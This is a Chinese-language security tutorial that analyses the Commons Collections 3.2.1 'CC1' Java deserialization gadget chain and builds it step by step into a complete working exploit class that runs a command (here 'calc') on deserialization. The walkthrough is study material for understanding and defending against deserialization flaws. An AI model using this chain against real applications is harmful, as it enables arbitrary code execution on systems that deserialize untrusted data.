### CommonsCollections cc1

#### 前置知识

    1. 了解什么是 java 反序列化
    2. 了解 java 反射
   
参考链接

[java反射](https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512)

#### 环境搭建

##### jdk的版本

关于 jdk 的版本，这里我选择的是 jdk8u65，可自行在[官网下载](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#:~:text=Java%20SE%20Development%20Kit%208u65)，可在虚拟机里安装，然后把整个目录复制出来，避免污染物理机环境。

![jdk](img/jdk.png)

因为我们需要调试，所以我们需要 sun 包的源码，jdk 自带的 sun 包是没有源码的，我们从 openjdk 拖一份过来。

来到 https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4 ，点击左侧的 gz 下载，会得到一份上图的 .tar.gz 压缩包，jdk 下原来自带一个 src.zip 对这两个都进行解压，你会得到一个和上图同样的目录结构。我们来到，af660750b2f4\jdk-af660750b2f4\src\share\classes 下，有一个 sun 的文件夹，整个复制到被解压出来的 src 文件夹下。
最后我们配置下源码路径。

![project](img\projectstruct.png)

##### maven

新建一个 maven 项目，按照下图的配置启动，注意配置 jdk 的目录和启动模板。

![maven](img\maven_project.png)

不会配置 maven 的小伙伴请看 [maven教程](https://www.bilibili.com/video/BV1Fz4y167p5/?p=3&vd_source=953fbf17a8e8d4ac23babb07f8cce168)，看前几章就好。

pom.xml，这里我们选择的是 3.2.1 版本的 Commons Collections。

![pom](img\pom.png)

可在maven的仓库搜索到 [mvnrepository](https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1)

#### 调用流程分析

首先看下我们需要打交道的接口，可以看到声明了一个 transform 方法。

![interface](img\interface.png)

我们来看下它的实现类，ctrl + H 。

![class](img\interface_class.png)

先来看下主角 invokerTransformer 它的 transform 方法。

![invoke](img\invokerTransformer_transoform.png)

可以看到这是一个标准的 java 反射的写法，接受任意类，调用任意方法，如果我们能找到另一个方法，它调用了 invkerTransformer 的 transform 方法，那我们是不是就获得了任意命令执行呢？我们来看下都有谁调用了，find usages ，为了方便我们直接定位过去了。

![usage](img\transform_find_useage.png)

我们可以看到 TranformedMap 的 checkSetValue 方法调用了 transform 方法， 我们跟进去看看。

![TransformedMap_transformer](img\TransformedMap_transformer.png)

这个 valueTransformer 是什么，我们找下看，往上看。

![TransformedMap_structor](img\TransformedMap_structor.png)

一个 protected 构造器，那他内部是怎么调用的呢？

![TransformedMap](img\TransformedMap.png)

是一个 public decorate 方法返回了一个 TransformedMap 实例。

那我们现在想的是哪里调用了 checkSetValue 方法，我们同样 find usages 看一下。
我们可以在抽象类 AbstractinputCheckedMapDecorator 下看到一个 setValue 方法。

那哪里调用了这个 setValue 方法呢，我们同样 find usages 看一下，这里我们直接来到 AnnotationinvcationHandler 的 readObject 下。我们可以看到，经过一大串判断和操作后 有一个 memberValue.setValue 

![readobject](img\1.png)

**貌似这条链已经清晰了**

**AnnotationinvcationHandler.readObject >> AbstractinputCheckedMapDecorator.setValue >> TranformedMap.checkValue >> InvokerTransformer.transform**

接下来我们需要写出 payload ，顺便解决其中几个关键问题。

#### payload 编写

我们需要解决第一个问题，那就是 Runtime 这个类它是不可以序列化的，他没有继承 Serizlizable 接口。

![Runtime](img\runtime.png)

这是普通的反射调用。

```java
Class<Runtime> c = Runtime.class;
// Method getRuntimeMethod = c.getMethod("getRuntime", null); 
Runtime r = ((Runtime) getRuntimeMethod.invoke(null, null)); #无参构造
r.exec("calc");
```

我们用 InvokerTransformer 实现下，因为它是可以序列化的。

```java
Method getRuntimeMethod = ((Method) new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class));
Runtime r = ((Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod));
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
```

我们可以使用 ChainedTransformer 包装下，这样我们只需要调用一次，它会把前一个 InvokerTransformer 的输出作为下一个 transform方法的输入。

```java
Transformer[] transformers = new Transformer[]{
        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

我们需要把 Runtime.class 作为第一个 InvokerTransformer 运行的参数，这个等下我们再解决，我们继续往下走。
前面我们知道，TranformedMap 的 checkSetValue 方法会调用 trandsform 方法，所以我们需要构造一个 TranformedMap 实例，那就需要调用静态的 decorate 方法，返回一个 TranformedMap 实例。

我们先看下参数，第一个是一个 map，第二个我们用不到，因为我们调用的是 valueTransformer.trandsform ，第三个是我们前面构建的 chainedTransformer 。

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

```

实现代码
```java
HashMap<Object, Object> map = new HashMap<>();
map.put("key", "value");
Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
```

现在我们有了 transformedMap 实例，我们需要一个 AnnotationinvcationHandler 的实例，我们看下构造函数。

![Annotation](img\Annotation_strct.png)

是一个 default 权限，所以我们同样需要反射调用，我们用的注解类是 Target.class。

```java
Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
annotationInvocationConstructor.setAccessible(true);
Object o = annotationInvocationConstructor.newInstance(Target.class, transformedMap);
```

别忘了annotationInvocationConstructor 的 readObject 还有一大段判断过程。

```java
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    String name = memberValue.getKey();
    Class<?> memberType = memberTypes.get(name);
    if (memberType != null) {  // i.e. member still exists
        Object value = memberValue.getValue();
        if (!(memberType.isInstance(value) ||
            value instanceof ExceptionProxy)) {
            memberValue.setValue(
                new AnnotationTypeMismatchExceptionProxy(
                    value.getClass() + "[" + value + "]").setMember(
                        annotationType.members().get(name)));
```

先是 name = memberValue.getKey() 这就是我们前面构造 transformedMap 时候的 hashmap ，这里它会取 key，我们前面给的 key 值就是 key，下一步它会判断 memberType = memberTypes.get(name) ，它会去 Target.class 中找是不是有这个名字为 key 的 Type，如果不为空才能继续运行，很明显 Target.class 是没有名字叫 key 的 Type 的，但是它有一个 value Type。

```java
public @interface Target {
    ElementType[] value();
}
```
所以我们将 map.put("key", "value"); 改成 map.put("value", "value")

完整代码

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.crypto.dsig.Transform;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        Object o = annotationInvocationConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

效果

![end](img\end.png)


参考链接:

[bilibili白日梦组长](https://www.bilibili.com/video/BV1no4y1U7E1/?vd_source=953fbf17a8e8d4ac23babb07f8cce168)









